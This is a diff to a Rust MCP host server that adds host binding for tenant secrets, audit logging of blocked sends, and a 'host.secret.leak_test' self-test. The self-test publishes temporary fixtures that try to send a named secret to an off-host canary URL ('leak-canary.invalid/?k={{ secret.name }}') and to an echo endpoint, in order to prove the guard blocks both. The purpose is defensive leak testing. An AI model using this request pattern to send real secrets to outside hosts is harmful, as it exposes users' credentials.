@@ -2220,7 +2220,7 @@ fn host_tools_part_03() -> Vec<Tool> {
         ),
         Tool::new(
             "host.secret.set",
-            "Store an encrypted secret value under this tenant's namespace.",
+            "Store an encrypted secret value under this tenant's namespace, optionally bound to the hosts it may be sent to.",
             host_schema(
                 json!({
                     "name": {
@@ -2231,6 +2231,11 @@ fn host_tools_part_03() -> Vec<Tool> {
                         "type": "string",
                         "description": "The secret value; stored AES-256-GCM encrypted, never returned.",
                     },
+                    "hosts": {
+                        "type": "array",
+                        "items": {"type": "string"},
+                        "description": "Hostnames this secret may be sent to (api.example.com, or *.example.com). A call that would send the value to any other host fails secret_leak_blocked. Omit to keep an existing binding; [] clears it.",
+                    },
                 }),
                 &["name", "value"],
             ),
@@ -2239,6 +2244,27 @@ fn host_tools_part_03() -> Vec<Tool> {
             "host.secret.list",
             "List this tenant's secret names (never their values).",
             host_schema(json!({}), &[]),
+        ),
+        // PRD-mcphost-secret-non-exfiltration-proof R4.
+        Tool::new(
+            "host.secret.leak_test",
+            "Prove a secret cannot leave: publishes a transient http fixture that tries to \
+             echo the secret in a result and to send it to an off-host canary, calls both, \
+             removes the fixture, and returns {echo, egress, bound_hosts, checked_at} where each \
+             verdict is blocked or LEAKED. LEAKED fails the call with leak_test_failed.",
+            host_schema(
+                json!({
+                    "name": {
+                        "type": "string",
+                        "description": "The secret to test (host.secret.set).",
+                    },
+                    "echo_url": {
+                        "type": "string",
+                        "description": "Optional http(s) URL of an upstream that echoes its request body; the secret is sent there, so it must be bound to that host (or unbound). Omit to use the host's in-process echo.",
+                    },
+                }),
+                &["name"],
+            ),
         ),
         Tool::new(
             "host.registry.publish",
@@ -6152,10 +6178,17 @@ fn admin_tools() -> Vec<Tool> {
 
 // ---- secret resolver / call log, bridging async DB to the sync Kind API --
 
-struct MapSecretResolver(HashMap<String, String>);
+struct MapSecretResolver {
+    values: HashMap<String, String>,
+    hosts: HashMap<String, Vec<String>>,
+}
 impl SecretResolver for MapSecretResolver {
     fn resolve(&self, name: &str) -> Option<String> {
-        self.0.get(name).cloned()
+        self.values.get(name).cloned()
+    }
+
+    fn bound_hosts(&self, name: &str) -> Option<Vec<String>> {
+        self.hosts.get(name).cloned()
     }
 }
 
@@ -6163,7 +6196,21 @@ pub(crate) async fn build_secret_resolver(
     state: &AppState,
     tenant_id: i64,
 ) -> Result<Arc<dyn SecretResolver>, AppError> {
-    Ok(Arc::new(MapSecretResolver(build_secret_map(state, tenant_id).await?)))
+    let values = build_secret_map(state, tenant_id).await?;
+    secret_resolver_for(state, tenant_id, values).await
+}
+
+/// PRD-mcphost-secret-non-exfiltration-proof R1: a resolver over an
+/// already-built secret map plus the tenant's host bindings.
+async fn secret_resolver_for(
+    state: &AppState,
+    tenant_id: i64,
+    values: HashMap<String, String>,
+) -> Result<Arc<dyn SecretResolver>, AppError> {
+    // A tenant with no secrets has no bindings: skip the SELECT, so the hot
+    // path of an ordinary call (umeta_ac05) runs no query it did not before.
+    let hosts = if values.is_empty() { HashMap::new() } else { state.db.secret_hosts(tenant_id).await? };
+    Ok(Arc::new(MapSecretResolver { values, hosts }))
 }
 
 /// The tenant's secrets, name -> decrypted value: what
@@ -7590,6 +7637,9 @@ impl McpHostHandler {
             "host.org.leave" => crate::org::leave(&self.state, tenant, &args).await,
             "host.secret.set" => control::secret_set(&self.state, tenant, &args).await,
             "host.secret.list" => control::secret_list(&self.state, tenant).await,
+            "host.secret.leak_test" => {
+                self.secret_leak_test(tenant, args, calls_auth_method, end_user).await
+            }
             "host.registry.publish" => control::registry_publish(&self.state, tenant, &args).await,
             "host.state.get" => tenant_state::state_get(&self.state, tenant, &args, end_user).await,
             "host.state.set" => tenant_state::state_set(&self.state, tenant, &args, end_user).await,
@@ -8304,7 +8354,7 @@ impl McpHostHandler {
         };
 
         let secret_map = build_secret_map(&self.state, tenant.id).await?;
-        let secrets: Arc<dyn SecretResolver> = Arc::new(MapSecretResolver(secret_map.clone()));
+        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
         let log = Arc::new(BufferedLog(std::sync::Mutex::new(Vec::new())));
         let resources = Arc::new(CellResourceSink(std::sync::Mutex::new(None)));
         // PRD-mcphost-chain-host-steps P1 requirement 6 (AC6): see
@@ -8692,6 +8742,14 @@ impl McpHostHandler {
                 // `$MCPHOST_EGRESS_PROXY`) are the two codes
                 // `kinds::python::PythonKind::network_mode` raises.
                 match app_err.code() {
+                    // PRD-mcphost-secret-non-exfiltration-proof R5: one
+                    // `admin.audit_log` row per block (the self-test's own
+                    // fixture calls are expected blocks, not offences).
+                    "secret_leak_blocked" if !local_name.starts_with(crate::leakguard::FIXTURE_PREFIX) => {
+                        if let AppError::Structured { data, .. } = &app_err {
+                            crate::leakguard::record_block(&self.state.db, &tenant.namespace, local_name, data).await;
+                        }
+                    }
                     "plan_required" => {
                         let _ = self.state.db.record_network_denial("run_plan", Some(tenant.id)).await;
                     }
@@ -8909,7 +8967,7 @@ impl McpHostHandler {
         }
 
         let secret_map = build_secret_map(&self.state, tenant.id).await?;
-        let secrets: Arc<dyn SecretResolver> = Arc::new(MapSecretResolver(secret_map.clone()));
+        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
         // PRD-mcphost-dry-run-side-effects requirement 2/3: every bridge
         // write this call makes routes through this one `DryRunCtx` (shared
         // via `TenantStateBridge`/`TenantTableBridge`), rolled back once
@@ -10258,7 +10316,7 @@ impl McpHostHandler {
         }
 
         let secret_map = build_secret_map(&self.state, tenant.id).await?;
-        let secrets: Arc<dyn SecretResolver> = Arc::new(MapSecretResolver(secret_map.clone()));
+        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
         // PRD-mcphost-dry-run-side-effects requirement 1 / AC4: `test: true`
         // is this method's own opt-in (unlike `host.tool_test`, `test:
         // false`/absent is still a real, metered-by-nothing-extra debug run
@@ -10502,6 +10560,113 @@ impl McpHostHandler {
             tokio::time::sleep(std::time::Duration::from_millis(50)).await;
         };
         crate::example_propose::finish(&self.state, tenant, &req, prepared, outcome).await
+    }
+
+    /// PRD-mcphost-secret-non-exfiltration-proof R4: `host.secret.leak_test`.
+    /// Publishes two transient http fixtures (an echo leg and an egress leg
+    /// aimed at `leak-canary.invalid`), calls each through the ordinary tool
+    /// path (so the `calls` rows are real), removes them, and reports
+    /// whether the host blocked each leak.
+    async fn secret_leak_test(
+        &self,
+        tenant: &Tenant,
+        args: Value,
+        auth_method: &str,
+        end_user: Option<&crate::enduser::EndUser>,
+    ) -> Result<Value, AppError> {
+        use crate::leakguard::{FIXTURE_PREFIX, LEAK_CANARY_HOST, LEAK_ECHO_HOST};
+        let secret = args
+            .get("name")
+            .and_then(Value::as_str)
+            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'name'".into()))?
+            .to_string();
+        if secret.is_empty() || !secret.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
+            return Err(AppError::InvalidArgs(format!(
+                "name: '{secret}' must match ^[a-zA-Z0-9_]+$ to be referenced as secret.<name>"
+            )));
+        }
+        if !self.state.db.list_secret_names(tenant.id).await?.contains(&secret) {
+            return Err(AppError::InvalidArgs(format!(
+                "name: no secret '{secret}'; set it with host.secret.set first"
+            )));
+        }
+        let bound_hosts = self.state.db.secret_hosts(tenant.id).await?.remove(&secret);
+        let echo_target = match args.get("echo_url").and_then(Value::as_str) {
+            Some(url) => url.to_string(),
+            None => format!("https://{LEAK_ECHO_HOST}/echo"),
+        };
+        let plan = self.state.plans.get(&tenant.plan).ok_or_else(|| {
+            AppError::Internal(format!("tenant's plan '{}' is not in the loaded plan catalog", tenant.plan))
+        })?;
+        let versions_max = plan.versions_max;
+
+        let nonce = format!("{:016x}", rand::random::<u64>());
+        let echo_name = format!("{FIXTURE_PREFIX}{nonce}_echo");
+        let egress_name = format!("{FIXTURE_PREFIX}{nonce}_egress");
+        let echo_spec = json!({
+            "method": "POST",
+            "url": echo_target,
+            "body": {"k": format!("{{{{ secret.{secret} }}}}")},
+            "args_schema": {"type": "object"},
+        });
+        let egress_spec = json!({
+            "method": "GET",
+            "url": format!("https://{LEAK_CANARY_HOST}/?k={{{{ secret.{secret} }}}}"),
+            "args_schema": {"type": "object"},
+        });
+
+        let run = async {
+            self.state
+                .db
+                .upsert_tool(tenant.id, echo_name.clone(), "http".into(), echo_spec, versions_max, vec![])
+                .await?;
+            let echo_result = self
+                .call_published_tool(tenant, &echo_name, json!({}), false, None, None, end_user, auth_method, None)
+                .await;
+            let echo = match &echo_result {
+                Err(e) if e.code() == "secret_leak_blocked" => "blocked",
+                Err(_) => "error",
+                Ok(_) => "LEAKED",
+            };
+            // An unbound secret may go anywhere by design, so the egress leg
+            // is not sent for it (the canary would be a real request).
+            let egress = if bound_hosts.is_none() {
+                "unbound"
+            } else {
+                self.state
+                    .db
+                    .upsert_tool(tenant.id, egress_name.clone(), "http".into(), egress_spec, versions_max, vec![])
+                    .await?;
+                match self
+                    .call_published_tool(tenant, &egress_name, json!({}), false, None, None, end_user, auth_method, None)
+                    .await
+                {
+                    Err(e) if e.code() == "secret_leak_blocked" => "blocked",
+                    _ => "LEAKED",
+                }
+            };
+            Ok::<_, AppError>((echo, egress))
+        };
+        let outcome = run.await;
+        // The fixtures never outlive the call, whatever happened above.
+        let _ = self.state.db.remove_tool(tenant.id, echo_name).await;
+        let _ = self.state.db.remove_tool(tenant.id, egress_name).await;
+        let (echo, egress) = outcome?;
+
+        let report = json!({
+            "echo": echo,
+            "egress": egress,
+            "bound_hosts": bound_hosts.unwrap_or_default(),
+            "checked_at": crate::state::now_unix(),
+        });
+        if echo == "LEAKED" || egress == "LEAKED" {
+            return Err(AppError::Structured {
+                code: crate::leakguard::LEAK_TEST_FAILED,
+                message: format!("secret '{secret}' was not blocked (echo: {echo}, egress: {egress})"),
+                data: report,
+            });
+        }
+        Ok(report)
     }
 
     async fn host_tool_call(
@@ -11665,8 +11830,11 @@ impl ServerHandler for McpHostHandler {
         let sampling_peer = gate.sampling.then(|| ctx.peer.clone());
         // PRD-mcphost-key-scoped-to-tools R3: the cell `call_tool_inner`
         // fills once a sub-key resolves, read by the `calls` insert.
-        let inner = crate::subkeys::CALL_KEY
-            .scope(std::cell::Cell::new(None), self.call_tool_inner(request, ctx));
+        let inner = crate::leakguard::UNBOUND_SENT.scope(
+            Default::default(),
+            crate::subkeys::CALL_KEY
+                .scope(std::cell::Cell::new(None), Box::pin(self.call_tool_inner(request, ctx))),
+        );
         let inner = crate::sampling::SAMPLING_CLIENT
             .scope(crate::sampling::SamplingClient { peer: sampling_peer, session_id: gate.session_id.clone() }, inner);
         let inner = crate::inband::CALL_GATE.scope(gate, inner);
@@ -13037,6 +13205,12 @@ impl McpHostHandler {
                 }
                 if let Some(url) = invite_hint_url {
                     meta.0.insert("invite_url".to_string(), json!(url));
+                }
+                // PRD-mcphost-secret-non-exfiltration-proof R3: unbound
+                // secrets this call sent upstream, so the agent can bind them.
+                let unbound_sent = crate::leakguard::take_unbound_sent();
+                if !unbound_sent.is_empty() {
+                    meta.0.insert("unbound_secret_sent".to_string(), json!(unbound_sent));
                 }
                 // PRD-mcphost-delegation-bound-to-run-or-session AC1: the
                 // connection's own id, so a lead can see what `bind:
